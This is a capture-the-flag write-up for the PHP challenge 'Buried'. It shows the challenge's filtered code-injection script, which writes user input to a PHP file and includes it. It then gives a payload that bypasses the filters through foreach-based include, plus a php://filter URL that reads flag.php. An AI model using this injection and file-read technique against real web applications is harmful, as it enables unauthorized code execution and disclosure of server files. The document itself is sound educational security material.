## Buried(9 solves, second blood)

```
Flag in flag.php.

link

Author: HERA
```

```php
<?php

show_source(__FILE__);


if (sizeof($_REQUEST)===1 && sizeof($_POST)===1){
    $cmd=$_POST['cmd'];    
    $a=array('!','#','%','&','\*','\+','\/',':','\?','@','\[','\]','\^','`','\{','\|','\}','~','[0-9]');
    if (isset($cmd)){
        if(preg_match('/.*show_source.*\(/i',$cmd)===0 && preg_match('/\"(\s)*show_source(\s)*\"(\s)*;/', $cmd)===0 ){
            if(preg_match_all('/\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)(\s)*=/', $cmd, $matches)<=1){
                if(preg_match('/\((.*)(!\.)\)/i', $cmd)===0 && substr_count($cmd, '.')<=1){
                    $exists=0;
                    foreach ($a as $key) {
                        if(preg_match("/(\.)*".$key."(\.)*/",$cmd)){
                            print($key);
                            $exists+=1;
                        }
                    }
                    if($exists===0){

                        if(!(preg_match('~(?:#|//|\/\*)[^\r\n]*|/\*.*?\*/~',$cmd))){
                        $file="./files/".rand().'.php';
                        file_put_contents($file,'<?php '.$cmd.' ?>');
                        include($file);

                    }else{
                        die("How dare u!");
                    }
                }else{
                    die("How dare u!");
                }

                }else{
                    die("How dare u!");
                }


            }else{
                die("How dare u!");
            }


        }else{
            die("How dare u!");
        }

    }else{
        die("How dare u!");
    }
}else{
    die("How dare u!");
}

?>
```

As we can use `a-zA-Z$_;`, I'll try something fun.

And, if we check `phpinfo()`, All the functions were disabled.

The thing we have to know is `$_GET` or `$_POST` is treating as an array in php. So, we can use `foreach` with `$_GET`. But we need to bypass `if (sizeof($_REQUEST)===1 && sizeof($_POST)===1)`. How?

```php
$file="./files/".rand().'.php';
file_put_contents($file,'<?php '.$cmd.' ?>');
```

As the file written in `./files` directory, I can access directly. So, this one will be a method of bypass.

And, I can also leak whole path via `__FILE__`.

So, the payload of mine was

```php
cmd=echo __FILE__;foreach($_GET as $key => $value) include $value;
```

I used `include` for getting file contents. We need to use `php wrapper` because all the functions of PHP were disabled. So, the final payload will be like this

```
http://buried.fword.wtf/files/530964126.php?asd=php://filter/convert.base64-encode/resource=../flag.php
```



This is unintended solution. Intended one was lua exploit.